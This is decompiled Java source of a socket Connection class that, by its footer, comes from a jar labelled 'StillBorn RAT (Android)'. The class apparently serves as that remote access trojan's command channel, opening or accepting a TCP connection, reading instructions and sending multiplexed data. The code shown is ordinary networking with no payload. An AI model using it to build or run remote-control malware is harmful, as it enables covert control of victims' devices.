/*   1:    */ package out;
/*   2:    */ 
/*   3:    */ import in.Demux;
/*   4:    */ import in.Receiver;
/*   5:    */ import inout.Controler;
/*   6:    */ import java.io.DataInputStream;
/*   7:    */ import java.io.DataOutputStream;
/*   8:    */ import java.io.IOException;
/*   9:    */ import java.net.ServerSocket;
/*  10:    */ import java.net.Socket;
/*  11:    */ import java.nio.ByteBuffer;
/*  12:    */ 
/*  13:    */ public class Connection
/*  14:    */ {
/*  15:    */   Socket s;
/*  16: 40 */   String ip = "localhost";
/*  17: 41 */   int port = 5555;
/*  18:    */   DataOutputStream out;
/*  19:    */   DataInputStream in;
/*  20: 45 */   boolean stop = false;
/*  21:    */   ByteBuffer readInstruction;
/*  22:    */   Mux m;
/*  23:    */   Demux dem;
/*  24:    */   Controler controler;
/*  25:    */   Receiver receive;
/*  26:    */   
/*  27:    */   public Connection(String ip, int port)
/*  28:    */   {
/*  29: 54 */     this.ip = ip;
/*  30: 55 */     this.port = port;
/*  31:    */   }
/*  32:    */   
/*  33:    */   public Connection(String ip, int port, Controler ctrl)
/*  34:    */   {
/*  35: 60 */     this.ip = ip;
/*  36: 61 */     this.port = port;
/*  37: 62 */     this.controler = ctrl;
/*  38:    */   }
/*  39:    */   
/*  40:    */   public boolean connect()
/*  41:    */   {
/*  42:    */     try
/*  43:    */     {
/*  44: 69 */       this.s = new Socket(this.ip, this.port);
/*  45: 70 */       this.in = new DataInputStream(this.s.getInputStream());
/*  46: 71 */       this.out = new DataOutputStream(this.s.getOutputStream());
/*  47: 72 */       this.m = new Mux(this.out);
/*  48: 73 */       this.dem = new Demux(this.controler, "moi");
/*  49: 74 */       this.receive = new Receiver(this.s);
/*  50: 75 */       return true;
/*  51:    */     }
/*  52:    */     catch (IOException e)
/*  53:    */     {
/*  54: 78 */       e.printStackTrace();
/*  55:    */     }
/*  56: 79 */     return false;
/*  57:    */   }
/*  58:    */   
/*  59:    */   public boolean reconnect()
/*  60:    */   {
/*  61: 85 */     return connect();
/*  62:    */   }
/*  63:    */   
/*  64:    */   public boolean accept(ServerSocket ss)
/*  65:    */   {
/*  66:    */     try
/*  67:    */     {
/*  68: 92 */       this.s = ss.accept();
/*  69:    */       
/*  70: 94 */       this.in = new DataInputStream(this.s.getInputStream());
/*  71: 95 */       this.out = new DataOutputStream(this.s.getOutputStream());
/*  72: 96 */       this.m = new Mux(this.out);
/*  73: 97 */       return true;
/*  74:    */     }
/*  75:    */     catch (IOException e)
/*  76:    */     {
/*  77:102 */       e.printStackTrace();
/*  78:    */     }
/*  79:103 */     return false;
/*  80:    */   }
/*  81:    */   
/*  82:    */   public ByteBuffer getInstruction()
/*  83:    */     throws Exception
/*  84:    */   {
/*  85:109 */     this.readInstruction = this.receive.read();
/*  86:111 */     if (this.dem.receive(this.readInstruction)) {
/*  87:112 */       this.readInstruction.compact();
/*  88:    */     } else {
/*  89:114 */       this.readInstruction.clear();
/*  90:    */     }
/*  91:116 */     return this.readInstruction;
/*  92:    */   }
/*  93:    */   
/*  94:    */   public void sendData(int chan, byte[] packet)
/*  95:    */   {
/*  96:121 */     this.m.send(chan, packet);
/*  97:    */   }
/*  98:    */   
/*  99:    */   public void stop()
/* 100:    */   {
/* 101:    */     try
/* 102:    */     {
/* 103:126 */       this.s.close();
/* 104:    */     }
/* 105:    */     catch (IOException localIOException) {}
/* 106:    */   }
/* 107:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     out.Connection
 * JD-Core Version:    0.7.0.1
 */